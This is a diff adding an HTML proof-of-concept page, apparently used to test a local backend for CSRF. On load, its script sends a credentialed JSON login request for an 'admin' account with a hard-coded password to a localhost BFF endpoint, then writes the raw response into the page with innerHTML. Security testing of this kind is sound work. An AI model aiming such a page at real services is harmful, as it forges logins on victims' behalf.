@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { font-family: Arial; padding: 50px; }
+        .result { background: #f0f0f0; padding: 20px; border-radius: 8px;
+                  margin-top: 20px; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <h1> CSRF Attack via JSON</h1>
+    <p>Executing attack...</p>
+    <div id="result" class="result">Waiting for response...</div>
+    
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:4200/bff/account/login", true);
+        xhr.withCredentials = true; 
+        xhr.setRequestHeader("Content-Type", "application/json");
+        
+        xhr.onload = function() {
+            document.getElementById("result").innerHTML =                 
+                "<p><strong>Status:</strong> " + xhr.status + "</p>" +
+                "<p><strong>Response:</strong></p><pre>" + xhr.responseText + "</pre>";                
+        };
+        
+        xhr.onerror = function() {
+            document.getElementById("result").innerHTML = 
+                "<h3> Request sent (may have succeeded)</h3>" +
+                "<p>Check your BFF logs to confirm if the attack worked.</p>";
+        };
+        
+        xhr.send(JSON.stringify({
+            userName: "admin",
+            password: "Admin1234!"
+        }));
+    </script>
+</body>
+</html>
